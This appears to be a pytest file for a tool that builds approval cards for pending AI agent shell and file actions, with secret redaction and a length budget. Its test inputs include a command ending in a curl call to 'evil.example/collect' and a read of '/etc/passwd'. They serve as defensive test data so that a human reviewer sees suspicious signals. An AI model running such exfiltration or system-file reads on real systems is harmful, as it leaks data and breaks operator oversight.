"""Review card copy tests."""

from __future__ import annotations

from urllib.parse import urlparse

from ..review_copy import (
    REVIEW_MESSAGE_MAX,
    build_review_message,
    pending_display_command,
)


def test_pending_display_command_reads_aliases_and_skips_truncated() -> None:
    assert pending_display_command({"command": "ls /tmp"}) == "ls /tmp"
    assert pending_display_command({"cmd": "pwd"}) == "pwd"
    assert pending_display_command({"code": "print(1)"}) == "print(1)"
    assert pending_display_command({"command": "[TRUNCATED]"}) is None
    assert pending_display_command({"command": "   "}) is None
    assert pending_display_command(None) is None


def test_exec_review_includes_likely_and_command() -> None:
    msg = build_review_message(
        pending_tool="exec",
        pending_args={"command": "curl https://example.com"},
        scan_description="Likely: fetch a remote URL\nrun: `[TRUNCATED]`\n(010)",
    )
    assert msg.startswith("Likely: fetch a remote URL")
    assert "curl https://example.com" in msg
    assert "(010)" not in msg
    assert "Allow once" in msg
    assert len(msg) <= REVIEW_MESSAGE_MAX


def test_long_command_keeps_signal_and_stays_under_budget() -> None:
    command = f"python3 -c {'print(1); ' * 80}curl https://evil.example/collect"
    msg = build_review_message(
        pending_tool="terminal",
        pending_args={"command": command},
        scan_description="Likely: run a shell command\nrun: `[TRUNCATED]`\n(AIRA-010)",
    )
    assert "[TRUNCATED]" not in msg
    assert "evil.example" in msg
    assert msg.startswith("Likely:")
    assert "(AIRA-010)" not in msg
    assert len(msg) <= REVIEW_MESSAGE_MAX


def test_scrubs_secrets_on_operator_card() -> None:
    token = "ghp_1234567890abcdefghij"
    msg = build_review_message(
        pending_tool="exec",
        pending_args={
            "command": f"curl -H 'Authorization: token {token}' https://api.github.com"
        },
        scan_description="Likely: run a shell command",
    )
    assert token not in msg
    assert "[REDACTED]" in msg
    urls = [part for part in msg.split() if "://" in part]
    assert any(urlparse(url).hostname == "api.github.com" for url in urls)


def test_fallback_likely_when_scan_description_missing() -> None:
    msg = build_review_message(
        pending_tool="exec",
        pending_args={"command": "gog gmail search 'Q1 review'"},
    )
    assert msg.startswith("Likely: run a shell command")
    assert "gog gmail search" in msg


def test_non_exec_tool_prefix() -> None:
    msg = build_review_message(
        pending_tool="write",
        pending_args={"code": "print('x')"},
        scan_description="Likely: write a file",
    )
    assert "`write`:" in msg
    assert "print('x')" in msg


def test_fallback_summary_branded_and_strips_ids() -> None:
    msg = build_review_message(
        pending_tool="read_file",
        pending_args={},
        scan_description="Suspicious path access\n(010, 011)",
        scan_summary="unused when description present",
    )
    assert msg.startswith("Sentrook:")
    assert "Suspicious path access" in msg
    assert "(010" not in msg


def test_hosted_likely_passthrough_without_local_command() -> None:
    msg = build_review_message(
        pending_tool="read",
        pending_args={},
        scan_description="Likely: read a filesystem path\n`read` `/etc/passwd`\n(010)",
    )
    assert msg.startswith("Likely: read a filesystem path")
    assert "(010)" not in msg
    assert "/etc/passwd" in msg
